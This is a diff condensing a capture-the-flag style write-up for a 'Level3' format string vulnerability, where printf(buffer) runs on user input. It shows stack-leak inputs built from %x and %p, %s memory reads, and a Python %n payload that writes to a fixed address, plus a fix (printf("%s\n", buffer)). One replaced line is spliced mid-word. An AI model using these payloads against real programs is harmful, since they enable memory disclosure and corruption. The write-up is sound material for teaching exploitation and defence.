@@ -1,220 +1,27 @@
 ## Level3 - Format String Vulnerability
-
-### Solution Summary
-The binary has a critical format string vulnerability where user input is passed directly to printf() without format string validation. This allows an attacker to read arbitrary values from the stack or memory using format specifiers like %x, %p, and %s.
-
-### Step 1: Extract Binary from VM
-```bash
-sshpass -p '<level2_password>' scp -P 4242 level3@localhost:/home/user/level3/level3 ./level3
-```
-
-### Step 2: Analyze the Vulnerability
-
-**Function v():**
-- Allocates 512 byte buffer
-- Reads input with fgets() (safe read)
-- BUT passes buffer directly to printf(): `printf(buffer);` ← FORMAT STRING VULNERABILITY!
-- This is the classic format string bug
-
-**The Vulnerability:**
-```c
-void v()
-{
-    char buffer[512];
-    fgets(buffer, sizeof(buffer), stdin);
-    printf(buffer);  // User input treated as format string!
-    fflush(stdout);
-}
-```
-
-### Step 3: Identify Exploitable Values
-
-When printf processes a format string, specifiers like %x and %p read values from the stack:
-
-- `%x` - Read 4 bytes as hex (unsigned int)
-- `%p` - Read 4 bytes as pointer (same as %x but prints with 0x prefix)
-- `%s` - Read pointer from stack, dereference it, print string
-- `%n` - Write to pointer on stack (dangerous!)
-
-### Step 4: Leak Stack Values
-
-Test with simple format specifiers to find what's on the stack:
-
-```bash
-# Leak first 15 stack values
-./level3 <<< "%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x."
-```
-
-This outputs:
-```
-200.f5fc95c0.80491a5.4b52414d.78255245.2e78252e....
-```
-
-Each %x reads the next 4-byte value from the stack.
-
-### Step 5: Identify Interesting Values
-
-Key observations:
-- `0x80491a5` - Program text segment address (return address related)
-- `0xf5fc95c0` - libc address (heap/library)
-- Stack contains return addresses, saved registers, function parameters
-
-### Step 6: Read Memory Addresses
-
-To read from a specific memory location:
-1. Put the address on the stack (or in buffer)
-2. Use %p or %s to dereference it
-
-Example - read from program memory:
-```bash
-./level3 <<< "AAA%s"  # Try to read string from address 0x41414141
-```
-
-### Step 7: Leak Sensitive Information
-
-The vulnerability allows reading:
-- Function return addresses (bypass ASLR on fixed systems)
-- Saved register values
-- Function parameters
-- Global variables
-- Any readable memory region
-
-### Step 8: Craft Exploitation on VM
-
-```bash
-ssh level3@<VM_IP> -p 4242
-
-# Simple format string leak
-./level3 <<< "%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p."
-
-# This reveals:
-# - Stack layout
-# - Potential return addresses
-# - Any sensitive values stored nearby
-```
-
-### Step 9: Advanced - Writing to Memory
-
-If you can identify a writable target address, %n allows writing:
-
-```bash
-# Craft address + format specifiers + %n
-python3 -c 'import struct;
-target = 0x08049xxx  # Some writable address
-fmt = struct.pack("<I", target) + "%x." * 5 + "%n"
-print(fmt, end="")' | ./level3
-```
-
-The %n will write the number of bytes printed so far to the target address.
-
-### Key Concepts
-
-**Format String Specifiers:**
-- `%x` or `%p` - Read from stack (leak values)
-- `%s` - Read string from memory address
-- `%n` - Write to memory address (requires pointer on stack)
+User input passed directly to printf() enables arbitra- `%n` - Write to pointer on stack
 - `%hn` - Write 2 bytes instead of 4
-- `%c` - Read single byte as character
 
-**Exploitation Strategy:**
-1. Identify what values are on the stack using %x/%p
-2. Determine offset to interesting values
-3. Use %s to read strings if pointer is available
-4. Calculate target address for writes if needed
-5. Use %n to write to modify program behavior
-
-**Stack Layout (after fgets and printf call):**
+### Exploitation
+**Leak stack values:**
+```bash
+./level3 <<< "%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x."
 ```
-[parameters to main]
-[saved EIP]
-[saved EBP]
-[saved EBX]
-[ESP -> buffer area]
+Output: 200.f5fc95c0.80491a5.4b52414d.78255245...
+Each %x reads next stack value.
+**Read from memory:**
+```bash
+./level3 <<< "AAAA%s"  # Read string from 0x41414141
 ```
-
-### Why This Works
-
-1. printf() with format string from buffer has no bounds
-2. Can read arbitrary positions on stack
-3. Can dereference any readable memory address
-4. Can write to writable addresses
-5. No validation of format string source
-
-### Typical Values Leaked
-
-```
-Offset 1: Usually 0x200 or frame size
-Offset 2: libc address (0xb7xxxxxx)
-Offset 3: Program code address (0x08xxxxxx)
-Offset 4+: Values from stack/registers
-```
-
-### Success Criteria
-
-When exploiting on VM:
-1. Use format string to leak stack values
-2. Identify useful addresses (return addresses, function pointers)
-3. Either:
-   - Read password from memory using %s
-   - Modify program state using %n
-   - Leak sensitive data from stack
-4. Gain shell access or read level4 password
-
-### Modern Protections
-
-This binary is compiled without modern protections:
-- No ASLR (addresses fixed)
-- No DEP/NX (could execute from stack)
-- No stack canaries
-- Format string vulnerability unrestricted
-
-### Countermeasures in Real Code
-
-Never do this:
-```c
-char buffer[512];
-fgets(buffer, 512, stdin);
-printf(buffer);  // WRONG!
-```
-
-Always use:
-```c
-char buffer[512];
-fgets(buffer, 512, stdin);
-printf("%s\n", buffer);  // CORRECT
-```
-
-### Example Python Exploit Script
-
+**Write to memory (requires target address on stack):**
 ```python
-import subprocess
 import struct
-
-def leak_stack(binary, depth=20):
-    """Leak stack values using format string"""
-    fmt = "%x." * depth + "\n"
-    result = subprocess.run([binary], input=fmt.encode(),
-                          capture_output=True, timeout=1)
-    return result.stdout.decode()
-
-def read_from_address(binary, address):
-    """Read string from memory address"""
-    fmt = struct.pack('<I', address) + b"%s\n"
-    result = subprocess.run([binary], input=fmt,
-                          capture_output=True, timeout=1)
-    return result.stdout.decode()
-
-# Usage
-leaked = leak_stack('./level3')
-print("Stack leak:", leaked[:200])
+target = 0x804988c  # Write target
+payload = struct.pack('<I', target) + b"C" * 60 + b"%4$n"
 ```
-
-### Conclusion
-
-Format string vulnerabilities are:
-- Easy to exploit
-- Powerful (read/write arbitrary memory)
-- Completely preventable (use format string literals)
-- Still found in modern code
-
-Always validate and control format strings!
+### Key Insights
+- No bounds on format string processing
+- Can read arbitrary stack/memory
+- Can write arbitrary values via %n
+- No ASLR or canaries in this binary
+- Completely preventable with printf("%s\n", buffer)
